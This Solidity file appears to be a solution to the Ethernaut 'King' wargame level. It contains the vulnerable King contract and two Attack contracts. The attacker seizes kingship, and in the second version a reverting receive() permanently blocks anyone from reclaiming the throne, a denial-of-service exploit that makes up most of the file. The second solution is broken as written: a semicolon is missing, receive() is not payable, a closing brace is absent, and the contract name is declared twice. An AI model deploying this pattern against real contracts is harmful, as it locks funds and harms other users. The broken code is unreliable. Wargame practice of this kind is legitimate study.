// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}


// SOL 1
// the whole sol is just to make sure nobody can send txn after you are king

contract Attack{
  constructor(address _addr) payable{
    King king = King(payable(_addr));
    uint256 prize = king.prize();
    (bool success,) = address(king).call{value:prize}("");
    require(success, "Txn failed, Try again");
  }
}

// SOL 2
// hence, dont define a fallback fucntion and if you define one, just add a revert() so it reverts all payment
// with this revert func, you might be experiencing JSONRPC error on Remix IDE

contract Attack{
  constructor(address _addr) payable{
    King king = King(payable(_addr));
    uint256 prize = king.prize();
    (bool success,) = address(king).call{value:prize}("");
    require(success, "Txn failed, Try again");
  }

receive() external {
revert("I am the only king, you cant dethrone me!")
}
